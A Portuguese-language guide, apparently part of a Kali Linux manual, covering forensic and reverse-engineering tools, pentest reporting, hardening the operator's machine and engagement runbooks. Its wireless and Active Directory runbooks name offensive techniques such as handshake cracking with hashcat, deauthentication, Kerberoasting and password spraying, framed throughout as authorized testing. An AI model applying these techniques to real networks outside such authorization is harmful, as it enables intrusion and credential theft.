As ferramentas forenses não toleram improviso. Fazer hash antes de abrir, trabalhar em cópias, usar write-block quando a origem é física e documentar o comando que produziu cada artefacto. A engenharia inversa é a mesma disciplina aplicada a código: compreender o comportamento antes de o correr fora de uma sandbox.

Nunca analisar a única cópia

Criar a imagem da origem, fazer o hash da imagem, fazer o hash da origem se possível, e trabalhar apenas na imagem. Uma montagem com acesso de escrita, uma «reparação» automática ou uma edição de metadados no local podem destruir a prova e a credibilidade. Usar um write blocker para suportes físicos e registar a ferramenta, a versão e a hora.

Volatility 3

pkg: pipx volatility3

O que faz. Analisa imagens de memória: processos, ligações de rede, módulos carregados, linhas de comando, código injetado e credenciais. Reconstrói estruturas do sistema operativo sem arrancar a máquina capturada. O Volatility já não está nos repositórios atuais do Kali, por isso é preciso instalá-lo num ambiente isolado.

python3 -m venv ~/tools/vol
. ~/tools/vol/bin/activate
pip install volatility3
vol -f evidence/mem.raw windows.info
vol -f evidence/mem.raw windows.pslist
vol -f evidence/mem.raw windows.netscan
vol -f evidence/mem.raw windows.malfind
Executar
Fazer o hash da imagem de memória antes da análise. Correr windows.info primeiro para confirmar a camada de símbolos, depois plugins dirigidos. Usar -o para manter a saída por plugin e --renderer json para evidência legível por máquina. Descarregar os símbolos uma vez e guardá-los com o caso para trabalho offline.
Evitar
Assumir que uma lista de processos está completa; os rootkits escondem-se e os processos terminados persistem em pools. Não analisar uma imagem viva no local, não correr plugins que modificam a imagem e não instalar dependências forenses globalmente numa estação de evidências.
Em vez de
O Volatility é para RAM; o Autopsy e o Sleuth Kit são para disco. Respondem a perguntas diferentes e são mais fortes juntos.

Autopsy

pkg: autopsy (2.24)

O que faz. Um navegador forense gráfico sobre o Sleuth Kit. A versão empacotada no Kali é a interface web clássica do Autopsy 2.24: cria um caso, acrescenta um anfitrião e uma imagem, e navega o sistema de ficheiros pelo browser. O Autopsy 4 é um download separado para ambiente de trabalho, com módulos de ingest e um fluxo diferente.

sudo autopsy
# depois abrir http://127.0.0.1:9999/autopsy
# criar caso → acrescentar anfitrião → acrescentar imagem → navegar
Executar
Criar um caso por assunto, acrescentar a imagem como anfitrião e registar o diretório do caso e o hash da imagem. Para o Autopsy 4, usar o instalador e os módulos de ingest; não assumir que o fluxo 2.24 se aplica. Exportar apenas o que o relatório precisa.
Evitar
Acrescentar um sistema de ficheiros vivo ou um disco de evidências montado. Não correr duas instâncias da interface contra a mesma base de dados de casos; a corrupção é silenciosa e cara.
Em vez de
Autopsy para uma GUI guiada; Sleuth Kit para extração programada e repetível. O Autopsy 2.24 é um browser sobre o TSK, por isso os resultados devem coincidir com a CLI.

Sleuth Kit (TSK)

pkg: sleuthkit

O que faz. Forense de sistemas de ficheiros em linha de comando: listar partições, percorrer diretórios, recuperar ficheiros por inode, construir cronologias e extrair dados não alocados. É o motor por baixo do Autopsy e a ferramenta certa para análise repetível e documentada.

mmls evidence/disk.img
fls -r -p -o 2048 evidence/disk.img
icat -o 2048 evidence/disk.img 12345 > evidence/recovered.bin
tsk_recover -o 2048 evidence/disk.img evidence/fs
Executar
mmls dá o offset da partição para -o. Usar fls -r -p para uma listagem recursiva de caminhos, icat para um inode, tsk_recover para uma árvore. Fazer o hash de cada ficheiro extraído e manter o registo de comandos.
Evitar
Adivinhar o offset ou o tipo de sistema de ficheiros. Não extrair para o diretório de evidências; escrever num diretório de trabalho separado e preservar a imagem original.
Em vez de
Autopsy quando é precisa uma GUI e ingest; TSK quando é precisa automação, um inode específico ou um histórico de comandos defensável.

binwalk

pkg: binwalk

O que faz. Analisa um binário ou uma imagem de firmware à procura de assinaturas embutidas — arquivos comprimidos, sistemas de ficheiros, kernels, bootloaders — e pode extraí-las. É a primeira ferramenta para um blob de firmware desconhecido.

binwalk firmware.bin
binwalk -A firmware.bin
binwalk -e firmware.bin
Executar
Primeiro a procura de assinaturas, depois a entropia, e a extração por último. -e usa extratores externos e pode precisar de --run-as=root quando corre como root. Trabalhar numa cópia dentro de um contentor e guardar a árvore extraída.
Evitar
Extrair firmware não confiável no anfitrião. Os arquivos podem conter path traversal, symlinks e scripts maliciosos. Não tratar um acerto de assinatura como prova de um sistema de ficheiros até o montar ou inspecionar.
Em vez de
O foremost extrai ficheiros por cabeçalho/fim a partir de imagens de disco; o binwalk encontra estruturas embutidas em firmware. Usar o binwalk para o contentor, o foremost para os destroços.

foremost

pkg: foremost

O que faz. Extrai ficheiros de imagens de disco ou de dados em bruto usando assinaturas de cabeçalho/fim. Não precisa que o sistema de ficheiros esteja intacto, o que o torna útil em suportes apagados ou corrompidos.

foremost -t all -i evidence/disk.img -o evidence/carved
Executar
Escolher os tipos de ficheiro com -t (ou uma configuração de /etc/foremost.conf) para reduzir falsos positivos. Extrair para um volume separado com espaço suficiente, depois fazer hash e rever a saída.
Evitar
Tratar cada ficheiro extraído como evidência; os extratores produzem fragmentos e falsos positivos. Não sobrescrever a imagem de origem nem o diretório de trabalho de um caso anterior.
Em vez de
O TSK recupera ficheiros com metadados do sistema de ficheiros; o foremost recupera conteúdo por assinatura. Se o sistema de ficheiros está intacto, o TSK é mais preciso; se não está, extrair.

ExifTool

pkg: libimage-exiftool-perl

O que faz. Lê e escreve metadados em imagens, documentos, áudio e vídeo: modelo de câmara, datas, GPS, software, autor, histórico de edições. É essencial para triagem de evidências e para compreender o que um ficheiro revela.

exiftool -a -u -g1 evidence/photo.jpg
exiftool -r -csv -ext jpg -ext png evidence/photos > evidence/metadata.csv
exiftool -GPSLatitude -GPSLongitude -n evidence/photo.jpg
exiftool -all= -o evidence/clean.jpg evidence/photo.jpg
Executar
Ler com -a -u -g1 para ver tags duplicadas e desconhecidas. Usar -csv para um corpus. Ao limpar metadados, escrever num ficheiro novo com -o; nunca modificar a evidência original.
Evitar
Confiar nos metadados como verdade absoluta; podem ser editados ou falsificados. Não publicar uma fotografia sem verificar primeiro os campos de GPS e de autor.
Em vez de
ExifTool para inspeção e edições controladas; mat2 para saneamento sistemático de metadados antes de partilhar. Ambos pertencem a um fluxo de privacidade.

radare2

pkg: radare2

O que faz. Um framework de engenharia inversa programável: desassemblagem, análise, depuração, patching, inspeção de strings e de estruturas. Corre no terminal e compõe-se com pipes, o que o torna ideal para triagem repetível de binários.

r2 -A ./binary
[0x00000000]> afl
[0x00000000]> pdf @ main
[0x00000000]> iz
[0x00000000]> axt @ sym.imp.strcpy
[0x00000000]> q
Executar
-A analisa ao carregar; afl lista funções; pdf imprime uma; iz mostra strings; axt encontra referências cruzadas. Usar rabin2 -I para um cabeçalho rápido e r2 -d para depurar em laboratório.
Evitar
Abrir com -w a menos que se pretenda fazer patching. Não correr um binário desconhecido fora de uma sandbox só para «ver o que faz»; primeiro estático, depois análise dinâmica isolada.
Em vez de
radare2 para triagem CLI rápida e scripting; Ghidra para saída descompilada tipo C e trabalho profundo de referências cruzadas. Ambos gratuitos e frequentemente usados juntos.

Ghidra

pkg: ghidra

O que faz. Uma suite de engenharia inversa de software com descompilador, desassemblador, navegador de símbolos e referências, scripting e seguimento de versões. Transforma código máquina em pseudo-C legível e torna binários grandes navegáveis.

ghidra
# headless analysis:
/usr/share/ghidra/support/analyzeHeadless /tmp/ghidra project -import ./binary
# then open the project in the GUI and inspect the decompiler
Executar
Criar um projeto por caso, importar, deixar a análise automática terminar e depois usar o descompilador e as referências cruzadas. O script support/analyzeHeadless é para trabalho em lote ou do lado do servidor. Manter notas dos nomes de funções e das hipóteses.
Evitar
Enviar binários confidenciais para um serviço de análise público. Não renomear nem alterar o ficheiro original; trabalhar numa cópia no projeto e registar os hashes.
Em vez de
Ghidra quando é precisa lógica descompilada; radare2 quando é precisa uma resposta rápida na CLI ou um script; um depurador quando é preciso comportamento em execução.

Relatório e evidências

O entregável é o relatório, não a shell

Um achado que não se consegue reproduzir é uma opinião. Um achado sem impacto é uma curiosidade. Um achado sem remediação segura é uma queixa. O relatório é onde o trabalho técnico se torna algo que o cliente pode orçamentar, priorizar e corrigir — por isso construir as evidências enquanto se testa, não na noite anterior.

Anatomia de um achado utilizável

CampoO que lá pertenceFalha comum
TítuloComponente + fraqueza + impacto«Injeção SQL» sem ativo
Ativo afetadoURL, anfitrião, porta, conta, ambienteApenas um IP de um scan antigo
ReproduçãoPassos numerados e o pedido exato«Usar sqlmap»
EvidênciaPedido/resposta, captura de ecrã, hash, dataScrollback de terminal não guardado
ImpactoO que o atacante ganha, em termos de negócio«Crítico porque CVSS 9.8»
RemediaçãoCorreção específica e testável, e controlo compensatório«Atualizar o servidor»
ReferênciasCVE, advisory do fabricante, OWASP/CWELinks quebrados e posts de blog

Severidade não é risco. Usar CVSS 3.1 de forma consistente e depois ajustar a narrativa à exposição, à sensibilidade dos dados e aos controlos compensatórios. Dizer que parte é medida e que parte é julgamento. Um vetor CVSS sem uma frase é um número à procura de discussão.

Plataformas de relatório

Dradis (empacotado no conjunto de relatório do Kali) importa a saída dos scanners para projetos, permite anexar evidências e exportar para Word/PDF. Faraday é uma plataforma cliente/servidor separada que importa muitos formatos de ferramentas para um espaço colaborativo; verificar se a versão instalada o inclui antes de contar com ele. Ambos acrescentam estrutura; nenhum escreve a análise de impacto. Estes projetos mudaram de empacotamento mais de uma vez, por isso confirmar a versão instalada. 

# Dradis: start the local server, then import scan output in the web UI.
sudo dradis-start
sudo dradis-stop   # when the engagement is over

O pacote de evidências

Manter um diretório por engagement, com subdiretórios que correspondam ao relatório. Escrever a saída bruta lá à medida que se trabalha e depois fazer o hash da árvore antes da entrega. É também a defesa se o cliente perguntar o que foi tocado. 

evidence/
  scope/          signed scope, contacts, exclusions
  scans/          nmap -oA, masscan, nuclei, nikto
  web/            saved requests, ffuf JSON, screenshots
  creds/          hashes and recovered passwords (encrypted)
  wifi/           captures, hc22000, ESSID list
  ad/             BloodHound ZIP, NetExec logs, Impacket output
  forensics/      images, hashes, tool versions, notes
  logs/           session transcripts and timestamps
  report/         draft, findings, remediation

script -a evidence/logs/session-$(date +%F).txt
find evidence -type f -print0 | xargs -0 sha256sum > evidence/SHA256SUMS
# Encrypt before moving or archiving; never email a plaintext evidence pack.
tar -czf evidence.tar.gz evidence
gpg -c evidence.tar.gz   # produces evidence.tar.gz.gpg

Os dados pessoais são radioativos

Extrair apenas a prova mínima. Ocultar tokens, IDs de sessão e registos pessoais nas capturas de ecrã. Guardar credenciais e evidências cifradas, restringir quem as lê e acordar uma data de destruição no contrato. «O cliente pode processar-nos» não é o único risco; as autoridades de proteção de dados têm o seu próprio calendário.

Um esqueleto de relatório que sobrevive à revisão

  1. Resumo executivo — duas páginas: o que foi testado, o que importa, o que corrigir primeiro.
  2. Âmbito e metodologia — ativos, datas, limites, ferramentas e o que explicitamente não foi testado.
  3. Achados por severidade — cada um com evidência, impacto e remediação; sem achados duplicados para uma só causa.
  4. Narrativa do ataque — a cadeia que importou, em prosa, com o detalhe mínimo necessário.
  5. Plano de remediação — ganhos rápidos, correções estruturais, passos de verificação e responsáveis.
  6. Anexo — saídas brutas, versões das ferramentas, hashes das evidências, glossário.

Para o consumidor de blue team do relatório, the red/blue lab manual mostra como os achados se tornam deteções.

Proteger o próprio Kali

O portátil de avaliação também é um alvo

Uma máquina de operador cheia de exploits, dados de clientes e credenciais é um alvo de alto valor. A mesma disciplina que se vende aos clientes aplica-se à própria máquina: menor privilégio, cifra, superfície de rede pequena, backups testados e separação limpa entre engagements.

Base

# Current system, current tools; snapshot first on a VM.
sudo apt update && sudo apt full-upgrade -y
sudo kali-tweaks

# Host firewall: deny inbound, allow outbound, rate-limit SSH.
sudo apt install ufw lynis
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw limit 22/tcp
sudo ufw enable

# Audit what is listening and what starts at boot.
sudo ss -tulpn
sudo systemctl list-unit-files --state=enabled
sudo lynis audit system

Não fiques fechado de fora

Aplicar regras de firewall a partir de uma consola local ou com uma segunda sessão SSH já aberta. Confirmar a regra de SSH antes de ativar a firewall e testar uma reconexão. A mesma regra vale para airmon-ng check kill remoto e para qualquer alteração que toque na interface que se está a usar.

A lista de verificação do operador

  • Cifra de disco completo no portátil; uma configuração LUKS com cabeçalho separado, se o custo de recuperação for aceitável.
  • Uma VM por engagement, ou pelo menos um snapshot por engagement. Nunca misturar capturas de um cliente com ferramentas de outro.
  • Um perfil de browser separado para testes, com o seu próprio armazém de CA e sem logins pessoais. Nunca importar uma CA de teste para o browser do dia a dia.
  • Sem segredos no histórico da shell. Usar variáveis de ambiente ou um gestor de palavras-passe; limpá-las depois de usar. Os tokens de API numa linha de comando acabam nos logs.
  • Só chaves SSH, com frase-passe e uma chave dedicada à avaliação. O artigo SSH configuration article cobre o lado do servidor.
  • Firejail ou uma VM descartável para visualizadores de risco e ficheiros desconhecidos. O Firejail manual é o guia prático.
  • Evidências cifradas e um período de retenção definido. Apagar os dados do cliente quando o contrato o disser, e registar a eliminação.
  • Sem listeners públicos. Ligar o ZAP, BeEF, SpiderFoot, Neo4j e Dradis a 127.0.0.1 a menos que se tenha adicionado autenticação e TLS.

Higiene de pacotes

O Kali é kali-rolling. Não adicionar repositórios stable/testing do Debian para «obter um pacote»; a mistura quebra dependências e é uma forma clássica de inutilizar um sistema rolling. Preferir pacotes do Kali, depois contentores ou ambientes virtuais para ferramentas que não estão empacotadas. Nunca canalizar um instalador remoto para uma shell root. 

# Prefer a virtual environment for Python tooling.
python3 -m venv ~/tools/venv
. ~/tools/venv/bin/activate
pip install --upgrade pip

# Or a disposable container for a single tool.
sudo docker run --rm -it --network host kalilinux/kali-rolling /bin/bash

O Docker manual e Debian security manual cobrem o lado dos contentores e o do anfitrião com mais profundidade. Para uma instalação defensiva, juntar este capítulo a The Security Paranoid e The TUI Privacy Manual.

Runbooks

A ordem das operações para quatro engagements comuns

Um runbook não é um script; é uma sequência de decisões com pontos de controlo. Adaptá-lo ao âmbito e anotar os desvios. Os tempos estão deliberadamente ausentes — pertencem ao contrato, não a um post de blog.

A. Avaliação de uma aplicação web externa

  1. Confirmar âmbito e contas. Domínios, subdomínios, perfis de login, caminhos excluídos, limites de taxa, janela de teste.
  2. Mapa passivo. whois/RDAP, certificate transparency, dnsrecon, amass passivo, theHarvester se os contactos estiverem no âmbito.
  3. Mapa ativo. nmap nos anfitriões no âmbito, whatweb/wafw00f em cada serviço web, anotar a stack e o WAF.
  4. Percurso pelo proxy. Burp ou ZAP com um browser dedicado; iniciar sessão com cada perfil, clicar em todas as funções, registar APIs e parâmetros escondidos.
  5. Descoberta de conteúdo. feroxbuster ou ffuf com filtros calibrados e taxa baixa; verificar cada acerto manualmente.
  6. Testes dirigidos. Autenticação, controlo de acesso, injeção, tratamento de ficheiros, lógica de negócio — escolher com base no mapa, não numa lista.
  7. Confirmar e minimizar. Reproduzir com o menor pedido; parar na prova; ocultar dados pessoais; guardar o pedido/resposta.
  8. Relatório e entrega. Achados, hashes das evidências, remediação, critérios de reteste. Fechar sessões e remover contas de teste.

B. Avaliação interna de Active Directory

  1. Definir o âmbito do domínio e o ponto de entrada. Nome do domínio, DCs, sub-redes, credenciais fornecidas, política de bloqueio, técnicas permitidas.
  2. Descoberta de baixo ruído. nmap no DC e nos servidores principais; confirmar DNS, LDAP, SMB, WinRM e Kerberos.
  3. Recolha do grafo. BloodHound com -c DCOnly primeiro; importar e ler os caminhos mais curtos antes de tocar em credenciais.
  4. Validar um caminho. NetExec ou Impacket num único anfitrião com a conta fornecida; parar numa prova só de leitura.
  5. Só se autorizado: Kerberoasting, AS-REP, relay ou spray dentro do orçamento de palpites e da janela de bloqueio acordados.
  6. Documentar a cadeia. Cada passo, data, anfitrião, referência de credencial e artefacto; sem capturas de dados não relacionados.
  7. Limpar. Remover ficheiros carregados, fechar sessões, restaurar configurações alteradas e reportar o caminho exato ao cliente.

C. Levantamento wireless e captura autorizada

  1. Confirmar o âmbito de rádio e a base legal. Site, canais, clientes, horas, se o deauth é permitido. Se não for, só passivo.
  2. Verificação de hardware. Modo monitor e injeção com o adaptador; passar o USB para a VM; registar o modelo do adaptador.
  3. Levantamento passivo. Kismet ou airodump-ng; mapear SSIDs, BSSIDs, canais, cifra, clientes e cobertura de sinal.
  4. Seleção de alvo. Escolher um BSSID autorizado; anotar WPA2/WPA3, PMF, WPS e número de clientes.
  5. Captura. Fixar canal e BSSID, capturar um handshake natural; usar um deauth mínimo apenas se o âmbito o permitir.
  6. Converter e quebrar. hcxpcapngtool para hc22000, hashcat -m 22000 com uma wordlist dirigida; parar quando a chave está provada.
  7. Relatório e restauro. Parar o modo monitor, restaurar o NetworkManager, remover capturas desnecessárias, fazer o hash das evidências.

D. Triagem de memória e disco após um incidente

  1. Preservar. Isolar o anfitrião, não reiniciar, documentar quem lhe tocou e quando. Fotografar o ecrã se o estado importar.
  2. Adquirir a memória primeiro. Usar uma ferramenta de aquisição de confiança, fazer o hash da imagem, registar a versão da ferramenta e a hora.
  3. Criar a imagem do disco. Write blocker para suportes físicos; dc3dd/ddrescue para um disco com falhas; hash da origem e da imagem.
  4. Trabalhar em cópias. Volatility para RAM, Autopsy/TSK para disco, binwalk/foremost para firmware ou dados em bruto.
  5. Responder a perguntas, não a tudo. Cronologia, persistência, movimento lateral, acesso a dados. Cada conclusão precisa de uma referência a um artefacto.
  6. Empacotar. Árvore de evidências, hashes, comandos, versões, achados. Entregar cifrado e documentar a destruição.

E. O dia do relatório

  1. Congelar as evidências. Fazer o hash da árvore, exportar os logs das ferramentas, fechar sessões e parar listeners.
  2. Eliminar duplicados. Uma causa, um achado; ligar os ativos afetados em vez de repetir o mesmo parágrafo.
  3. Verificar cada reprodução. Outra pessoa deve conseguir seguir os passos sem nós.
  4. Escrever o resumo executivo por último. Deve refletir os achados, não o esforço.
  5. Ocultar e cifrar. Remover tokens e dados pessoais; cifrar o pacote; partilhar por um canal acordado.
  6. Preparar o reteste. Definir critérios de aprovação/reprovação antes de o cliente começar a corrigir, para que a ronda seguinte seja mensurável.

Pares que se confundem muitas vezes

ParA diferença que importa
nmap vs masscanO nmap interpreta serviços e scripts; o masscan só encontra candidatos TCP depressa e pode falhar. Confirmar o masscan com nmap.
gobuster vs ffufO gobuster tem modos fixos (dir/dns/vhost); o ffuf faz fuzz de qualquer posição com filtros. Usar gobuster para uma passagem padrão, ffuf para uma pergunta precisa.
Burp vs ZAPO Burp Community é o melhor proxy manual; o ZAP é totalmente open source com um scanner ativo gratuito. O Burp Pro acrescenta o scanner e a gravação de projetos.
John vs hashcatO John é CPU-first com conversores de formato; o hashcat é GPU-first com modos e máscaras. Mesmos hashes, economias diferentes.
Hydra vs ResponderO Hydra adivinha credenciais contra um serviço; o Responder captura hashes de broadcasts de resolução de nomes. Adivinhar online vs capturar credenciais.
Wireshark vs tcpdumpWireshark/tshark dissecam protocolos; o tcpdump captura e imprime pacotes compactos com BPF. Usar tcpdump para capturar, Wireshark para explicar.
aircrack-ng vs wifiteO aircrack-ng é a suite e o quebrador de CPU; o wifite orquestra a suite automaticamente. Controlo vs conveniência.
Metasploit vs searchsploitO Metasploit é um framework em execução com payloads e sessões; o searchsploit é um arquivo offline de código de exploit. Encontrar código não é correr um módulo testado.
Autopsy vs Sleuth KitO Autopsy é uma GUI e um fluxo de ingest sobre o TSK. O TSK é o motor programável. Mesma evidência, nível de controlo diferente.
binwalk vs foremostO binwalk encontra sistemas de ficheiros e arquivos embutidos num blob; o foremost extrai ficheiros por assinatura a partir de dados em bruto. Contentor vs destroços.
BloodHound vs NetExecO BloodHound explica porque uma identidade chega a um alvo; o NetExec verifica onde uma credencial funciona. Caminho vs acesso.
whatweb vs wafw00fO whatweb faz fingerprint da aplicação; o wafw00f identifica a firewall web à frente dela. Ambos são pistas, não vulnerabilidades.

Erros comuns

As falhas que terminam engagements, quebram redes ou anulam o relatório

A maioria não são erros de ferramenta; são erros de julgamento que a ferramenta torna visíveis. Ler uma vez antes do laboratório e outra antes da chamada com o cliente.

Em caso de dúvida, parar e perguntar

«Isto ainda está no âmbito?» é uma pergunta profissional, não uma fraqueza. Uma chamada de cinco minutos é mais barata que uma indisponibilidade, uma notificação de violação de dados ou uma data em tribunal. O cliente contratou-te para reduzir risco, não para criar um novo.
